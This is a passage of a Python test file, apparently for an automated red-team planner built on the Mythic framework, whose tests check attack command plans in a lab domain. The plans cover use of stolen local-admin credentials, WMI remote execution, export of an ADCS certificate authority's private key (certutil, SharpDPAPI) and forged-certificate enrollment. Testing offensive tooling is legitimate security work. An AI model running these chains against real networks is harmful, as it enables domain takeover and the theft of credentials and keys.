        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]

    async def fake_payload_type(callback_id):
        return "apollo"

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
    assert plan["commands"][0]["parameters"]["Credential"] == {
        "account": "Administrator",
        "credential": "CorrectHorseBatteryStaple!",
        "realm": "ca01",
        "type": "plaintext",
    }
    remote = plan["commands"][1]
    assert remote["parameters"]["host"] == "ca01.lab.local"
    assert "username" not in remote["parameters"]
    assert "password" not in remote["parameters"]
    assert "domain" not in remote["parameters"]
    encoded = remote["parameters"]["command"].split("-EncodedCommand ", 1)[1]
    script = base64.b64decode(encoded).decode("utf-16le")
    assert "Invoke-WmiMethod" not in script
    assert "certutil.exe -f -p" in script
    assert "PFX_BASE64=" in script
    assert plan["commands"][2]["parameters"] == {
        "path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_13.txt",
    }
    assert plan["commands"][3]["operation"] == "local-admin-logon-session-revert"


def test_build_capability_commands_adcs_ca_export_uses_merlin_profile_after_remote_exec(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]

    async def fake_payload_type(callback_id):
        assert callback_id == 13
        return "merlin"

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"]] == ["rev2Self", "run"]
    assert plan["commands"][0]["parameters"] == {}
    assert plan["commands"][1]["expected_probe"] == "extract_adcs_ca_private_key_probe"
    assert plan["commands"][1]["parameters"]["executable"] == "powershell.exe"


def test_build_capability_commands_adcs_ca_export_apollo_explicit_wmiexecute_still_uses_token_context(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]

    async def fake_payload_type(callback_id):
        return "apollo"

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
        {"adcs_ca_export_command": "wmiexecute"},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
    assert "username" not in plan["commands"][1]["parameters"]
    assert "password" not in plan["commands"][1]["parameters"]
    assert "domain" not in plan["commands"][1]["parameters"]


def test_build_capability_commands_adcs_ca_export_sharpdpapi_uses_powerpick(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    async def fake_ensure_tool_uploaded(binary_filename):
        return json.dumps({
            "status": "already_present",
            "binary_filename": binary_filename,
            "file_uuid": "sharpdpapi-file-uuid",
        })

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure_tool_uploaded)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
        {"adcs_ca_export_method": "sharpdpapi"},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"]] == ["upload", "powerpick"]
    assert plan["commands"][0]["parameters"]["File"] == "sharpdpapi-file-uuid"
    assert plan["commands"][1]["expected_probe"] == "extract_adcs_ca_private_key_probe"
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in plan["commands"][1]["parameters"]
    assert "SharpDPAPI.exe\" certificates /machine /nowrap" in plan["commands"][1]["parameters"]


def test_build_capability_commands_supports_local_admin_secret_use_from_credential_store():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 91,
                "account": "Administrator",
                "realm": "ws01",
                "type": "plaintext",
                "credential_text": "CorrectHorseBatteryStaple!",
                "comment": "managed local admin password for ws01",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "use-managed-local-admin-secret",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["effects"] == [
        "local-admin:ws01@child.lab.local",
        "admin:ws01",
        "system-or-admin:ws01",
    ]
    assert [command["command"] for command in plan["commands"]] == ["make_token", "ls"]
    assert plan["commands"][0]["parameters"]["credential"] == {
        "id": "91",
        "account": "Administrator",
        "realm": "ws01",
        "credential": "CorrectHorseBatteryStaple!",
        "type": "plaintext",
    }
    assert plan["commands"][1]["parameters"] == {"path": r"\\ws01.child.lab.local\C$"}


def test_execute_local_admin_secret_use_tasks_mythic_credential_reference(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop(
            "managed-local-admin-secret:ws01@child.lab.local",
            7200,
            callback_id="13",
            technique="capability:read-managed-local-admin-secret",
        )
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(
        0,
        result=_apollo_make_token_schema() if command == "make_token" else [],
    )
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_fetch_credentials(now):
        return [{
            "id": 91,
            "account": "Administrator",
            "realm": "ws01",
            "type": "plaintext",
            "credential_text": "CorrectHorseBatteryStaple!",
            "comment": "managed local admin password for ws01",
        }]

    mt._fetch_credentials_cached = fake_fetch_credentials
    calls = {"issue": 0}
    outputs = iter([
        "Successfully impersonated ws01\\Administrator for remote access.",
        "\n".join([
            r" Volume in drive \\ws01.child.lab.local\C$ has no label.",
            r" Directory of \\ws01.child.lab.local\C$",
            "06/10/2026  12:00 PM    <DIR>          Windows",
        ]),
    ])

    with _split_issue(lambda: next(outputs), calls, display_id=7201):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "use-managed-local-admin-secret",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, json.dumps(result, indent=2)
    assert result["verdict"] == "achieved"
    assert calls["issued"][0]["command_name"] == "make_token"
    assert calls["issued"][0]["parameters"]["Credential"] == "@cred:91"
    assert calls["issued"][1]["command_name"] == "ls"
    assert set(result["recorded_effects"]) == {
        "local-admin:ws01@child.lab.local",
        "admin:ws01",
        "system-or-admin:ws01",
    }


def test_deterministic_local_admin_secret_use_records_admin_effects_without_secret():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    action = capabilities.CapabilityAction(
        name="use-managed-local-admin-secret",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["managed-local-admin-secret:ws01@child.lab.local", "live-callback:13"],
        effects=["local-admin:ws01@child.lab.local", "admin:ws01", "system-or-admin:ws01"],
        intent={
            "capability": "use-managed-local-admin-secret",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    params = {"path": r"\\ws01.child.lab.local\C$"}
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("ls", params)
    ] = {
        "capability": "use-managed-local-admin-secret",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "expected_probe": "extract_local_admin_access_probe",
        "produces": ["local_admin_access_probe"],
        "consumes": ["local_admin_logon_context"],
    }
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    output = "\n".join([
        r" Volume in drive \\ws01.child.lab.local\C$ has no label.",
        r" Directory of \\ws01.child.lab.local\C$",
        "06/10/2026  12:00 PM    <DIR>          Windows",
    ])

    with _split_issue(output, display_id=7201):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("ls", params, 13, timeout=5))

    assert r"\\ws01.child.lab.local\C$" in result
    satisfied = {effect for hop in mt._engagement_hops for effect in hop.satisfied_effects}
    assert "local-admin:ws01@child.lab.local" in satisfied
    assert "admin:ws01" in satisfied
    assert "system-or-admin:ws01" in satisfied
    hop = mt._engagement_hops[-1]
    assert hop.technique == "capability:use-managed-local-admin-secret"
    assert hop.evidence["mythic_task_id"] == 7201
    assert hop.evidence["callback_id"] == 13
    assert "CorrectHorseBatteryStaple" not in json.dumps(hop.evidence)


def test_build_capability_commands_supports_remote_execution_from_local_admin_credential_store():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 91,
                "account": "Administrator",
                "realm": "ws01",
                "type": "plaintext",
                "credential_text": "CorrectHorseBatteryStaple!",
                "comment": "managed local admin password for ws01",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["effects"] == [
        "remote-exec:ws01@child.lab.local",
        "host-exec:ws01",
    ]
    assert [command["command"] for command in plan["commands"]] == ["wmiexecute", "cat"]
    assert plan["commands"][0]["parameters"]["host"] == "ws01.child.lab.local"
    assert plan["commands"][0]["parameters"]["username"] == "Administrator"
    assert plan["commands"][0]["parameters"]["password"] == "CorrectHorseBatteryStaple!"
    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in plan["commands"][0]["parameters"]["command"]
    assert plan["commands"][1]["parameters"] == {
        "path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt",
    }


def test_build_capability_commands_remote_execution_honors_explicit_proof_path():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 91,
                "account": "Administrator",
                "realm": "ws01",
                "type": "plaintext",
                "credential_text": "CorrectHorseBatteryStaple!",
                "comment": "managed local admin password for ws01",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {
            "proof_path": r"C:\Windows\Temp\sage_custom_diag.txt",
            "remote_exec_command": "wmiexecute",
        },
    )))

    assert plan["ok"] is True
    assert r"C:\Windows\Temp\sage_custom_diag.txt" in plan["commands"][0]["parameters"]["command"]
    assert plan["commands"][1]["parameters"] == {
        "path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_custom_diag.txt",
    }


def test_build_capability_commands_remote_execution_normalizes_unc_proof_directory():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 91,
                "account": "Administrator",
                "realm": "ws01",
                "type": "plaintext",
                "credential_text": "CorrectHorseBatteryStaple!",
                "comment": "managed local admin password for ws01",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {
            "proof_path": r"\\ws01.child.lab.local\C$\Windows\Temp",
            "remote_exec_command": "wmiexecute",
        },
    )))

    assert plan["ok"] is True
    assert r'C:\Windows\Temp\sage_remote_exec_ws01_13.txt' in plan["commands"][0]["parameters"]["command"]
    assert plan["commands"][1]["parameters"] == {
        "path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt",
    }


def test_build_capability_commands_apollo_remote_exec_uses_local_admin_context(monkeypatch):
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 91,
                "account": "Administrator",
                "realm": "ws01",
                "type": "plaintext",
                "credential_text": "CorrectHorseBatteryStaple!",
                "comment": "managed local admin password for ws01",
            },
        ]

    async def fake_payload_type(callback_id):
        return "apollo"

    mt._fetch_credentials_cached = fake_fetch_credentials
    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
    assert plan["commands"][0]["parameters"]["Credential"] == {
        "account": "Administrator",
        "credential": "CorrectHorseBatteryStaple!",
        "realm": "ws01",
        "type": "plaintext",
    }
    assert plan["commands"][1]["parameters"]["host"] == "ws01.child.lab.local"
    assert "domain" not in plan["commands"][1]["parameters"]
    assert "username" not in plan["commands"][1]["parameters"]
    assert "password" not in plan["commands"][1]["parameters"]
    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in plan["commands"][1]["parameters"]["command"]
    assert plan["commands"][2]["parameters"] == {
        "path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt",
    }
    assert plan["commands"][3]["operation"] == "local-admin-logon-session-revert"


def test_deterministic_remote_execution_records_effect_without_secret():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    params = {"path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"}
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("cat", params)
    ] = {
        "capability": "execute-as-local-admin",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "runtime_inputs": {
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "proof_marker": "SAGE_REMOTE_EXEC_PROOF_ws01_13",
        },
        "expected_probe": "extract_remote_execution_probe",
        "produces": ["remote_execution_proof"],
        "consumes": ["remote_process_created"],
    }
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    output = "\n".join([
        "SAGE_REMOTE_EXEC_PROOF_ws01_13",
        "ws01\\administrator",
        "WS01",
    ])

    with _split_issue(output, display_id=7301):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("cat", params, 13, timeout=5))

    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in result
    satisfied = {effect for hop in mt._engagement_hops for effect in hop.satisfied_effects}
    assert "remote-exec:ws01@child.lab.local" in satisfied
    assert "host-exec:ws01" in satisfied
    hop = mt._engagement_hops[-1]
    assert hop.technique == "capability:execute-as-local-admin"
    assert hop.evidence["mythic_task_id"] == 7301
    assert hop.evidence["callback_id"] == 13
    assert "CorrectHorseBatteryStaple" not in json.dumps(hop.evidence)


def test_execute_capability_remote_execution_records_final_proof(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("local-admin:ws01@child.lab.local", 7299, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    outputs = iter([
        "Command executed successfully",
        "\n".join([
            "SAGE_REMOTE_EXEC_PROOF_ws01_13",
            "ws01\\administrator",
            "WS01",
        ]),
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7302):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "execute-as-local-admin",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 2
    assert result["recorded_effects"] == [
        "host-exec:ws01",
        "remote-exec:ws01@child.lab.local",
    ]
    assert "CorrectHorseBatteryStaple" not in json.dumps(result["issued"])


def test_execute_capability_retries_missing_remote_exec_proof(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("local-admin:ws01@child.lab.local", 7299, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    outputs = iter([
        "Command executed successfully",
        r"File \\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt does not exist.",
        "\n".join([
            "SAGE_REMOTE_EXEC_PROOF_ws01_13",
            "ws01\\administrator",
            "WS01",
        ]),
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7303):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "execute-as-local-admin",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
                "callback_id": "13",
            },
            {"timeout": 5, "proof_retry_delay_seconds": 0},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 3
    assert [item["command_name"] for item in calls["issued"]] == ["wmiexecute", "cat", "cat"]
    assert result["issued"][2]["retry_attempt"] == 1
    assert result["recorded_effects"] == [
        "host-exec:ws01",
        "remote-exec:ws01@child.lab.local",
    ]


def test_execute_capability_apollo_remote_exec_records_local_admin_context_proof(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("local-admin:ws01@child.lab.local", 7299, callback_id="13"),
    ]
    mt._kerberos_logon_context_keys.add((13, "ws01", "administrator", True))
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_payload_type(callback_id):
        return "apollo"

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": target_host,
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    outputs = iter([
        "Command spawned PID (1372) successfully",
        "\n".join([
            "SAGE_REMOTE_EXEC_PROOF_ws01_13",
            "ws01\\administrator",
            "WS01",
        ]),
        "Reverted to original token",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7304):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "execute-as-local-admin",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert [item["command_name"] for item in calls["issued"]] == ["wmiexecute", "cat", "rev2self"]
    assert calls["issued"][0]["parameters"]["host"] == "ws01.child.lab.local"
    assert "domain" not in calls["issued"][0]["parameters"]
    assert "username" not in calls["issued"][0]["parameters"]
    assert "password" not in calls["issued"][0]["parameters"]
    assert result["issued"][-1]["cleanup"] is True
    assert result["recorded_effects"] == [
        "host-exec:ws01",
        "remote-exec:ws01@child.lab.local",
    ]


def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypatch, tmp_path):
    mt = _make_tools()
    monkeypatch.setenv("SAGE_ENGAGEMENT_STATE_DIR", str(tmp_path))
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    pfx_blob = b"0" + b"A" * 512
    pfx = base64.b64encode(pfx_blob).decode("ascii")
    pfx_sha256 = hashlib.sha256(pfx_blob).hexdigest()
    adcs_output = (
        "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
        "CA_HOST=CA01\\r\\n"
        "CA_EXPORT_STATUS=OK\\r\\n"
        "CA_SUBJECT=CN=LAB-CA\\r\\n"
        "CA_ISSUER=CN=LAB-CA\\r\\n"
        "CA_THUMBPRINT=ABCDEF1234\\r\\n"
        "CA_PFX_PATH=C:\\\\Windows\\\\Temp\\\\sage_ca_export_ca01_13.pfx\\r\\n"
        f"PFX_SHA256={pfx_sha256}\\r\\n"
        f"PFX_BASE64={pfx}\\r\\n'\n\n"
        "[SAGE OPSEC] footprint total=3"
    )
    outputs = iter(["Command executed successfully", adcs_output])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7401):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-ca-private-key-export",
                "target_host": "ca01",
                "target_domain": "lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 2
    assert result["recorded_effects"] == [
        "adcs-ca-private-key:ca01@lab.local",
        "adcs-ca:ca01@lab.local",
    ]
    assert [item["command"] for item in result["issued"]] == ["wmiexecute", "cat"]
    assert result["issued"][1]["verify_verdict"] == "achieved"
    assert "CorrectHorseBatteryStaple" not in json.dumps(result["issued"])
    hop = mt._engagement_hops[-1]
    assert hop.evidence["pfx_artifact_sha256"] == pfx_sha256
    assert Path(hop.evidence["pfx_artifact_path"]).is_file()
    assert hop.evidence["probe"]["pfx_artifact_sha256"] == pfx_sha256
    assert '"pfx_base64":' not in json.dumps(hop.evidence).casefold()


def test_execute_capability_apollo_adcs_ca_export_uses_token_backed_wmiexecute_readback(monkeypatch, tmp_path):
    mt = _make_tools()
    monkeypatch.setenv("SAGE_ENGAGEMENT_STATE_DIR", str(tmp_path))
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_payload_type(callback_id):
        return "apollo"

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": target_host,
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    pfx_blob = b"0" + b"A" * 512
    pfx = base64.b64encode(pfx_blob).decode("ascii")
    pfx_sha256 = hashlib.sha256(pfx_blob).hexdigest()
    adcs_output = (
        "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
        "CA_HOST=CA01\\r\\n"
        "CA_EXPORT_STATUS=OK\\r\\n"
        "CA_SUBJECT=CN=LAB-CA\\r\\n"
        "CA_ISSUER=CN=LAB-CA\\r\\n"
        "CA_THUMBPRINT=ABCDEF1234\\r\\n"
        "CA_PFX_PATH=C:\\\\Windows\\\\Temp\\\\sage_ca_export_ca01_13.pfx\\r\\n"
        f"PFX_SHA256={pfx_sha256}\\r\\n"
        f"PFX_BASE64={pfx}\\r\\n'\n\n"
        "[SAGE OPSEC] footprint total=3"
    )
    outputs = iter([
        "Successfully impersonated ca01\\Administrator",
        "Command spawned PID (1372) successfully",
        adcs_output,
        "Reverted identity to original token",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7402):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-ca-private-key-export",
                "target_host": "ca01",
                "target_domain": "lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert [item["command_name"] for item in calls["issued"]] == ["make_token", "wmiexecute", "cat", "rev2self"]
    assert calls["issued"][1]["parameters"]["host"] == "ca01.lab.local"
    assert "username" not in calls["issued"][1]["parameters"]
    assert "password" not in calls["issued"][1]["parameters"]
    assert "domain" not in calls["issued"][1]["parameters"]
    assert result["issued"][-1]["cleanup"] is True
    assert result["recorded_effects"] == [
        "adcs-ca-private-key:ca01@lab.local",
        "adcs-ca:ca01@lab.local",
    ]


def test_execute_capability_adcs_esc_enroll_records_certificate_effect():
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("adcs-ca-key-export-blocked:ca01@lab.local", 7401, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    pfx = base64.b64encode(b"0" + b"B" * 512).decode("ascii")
    output = "\n".join([
        "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_13",
        "CERT_ENROLL_STATUS=OK",
        "CERT_ENROLL_TEMPLATE=VulnerableUser",
        r"CERT_ENROLL_CA=ca01.lab.local\LAB-CA",
        r"CERT_PFX_PATH=C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
        f"PFX_BASE64={pfx}",
    ])
    calls = {"issue": 0}

    with _split_issue(output, calls, display_id=7402):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-esc-certificate-enroll",
                "domain": "lab.local",
                "account": "administrator",
                "ca_host": "ca01",
                "callback_id": "13",
            },
            {
                "ca_name": r"ca01.lab.local\LAB-CA",
                "template": "VulnerableUser",
                "timeout": 5,
            },
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 1
    assert result["recorded_effects"] == [
        "adcs-enrolled-certificate:administrator@lab.local",
    ]
    assert result["issued"][0]["verify_verdict"] == "achieved"


def test_execute_capability_adcs_ca_export_returns_key_not_exportable_blocker(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    outputs = iter([
        "Command executed successfully",
        (
            "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
            "CA_HOST=CA01\\r\\n"
            "CA_EXPORT_STATUS=FAILED\\r\\n"
            "CA_EXPORT_ERROR=Cannot export non-exportable private key.\\r\\n'\n\n"
            "[SAGE OPSEC] footprint total=3"
        ),
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7402):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-ca-private-key-export",
                "target_host": "ca01",
                "target_domain": "lab.local",
                "callback_id": "13",
            },
            {"timeout": 5, "adcs_dpapi_retry_attempted": True},
        )))

    assert result["ok"] is False
    assert result["verdict"] == "blocked"
    assert result["reason"] == "key not exportable"
    assert calls["issue"] == 2
    assert result["recorded_effects"] == []
    assert [item["command"] for item in result["issued"]] == ["wmiexecute", "cat"]
    assert result["issued"][1]["verify_verdict"] == "blocked"


def test_execute_capability_adcs_ca_export_does_not_auto_retry_sharpdpapi(monkeypatch):
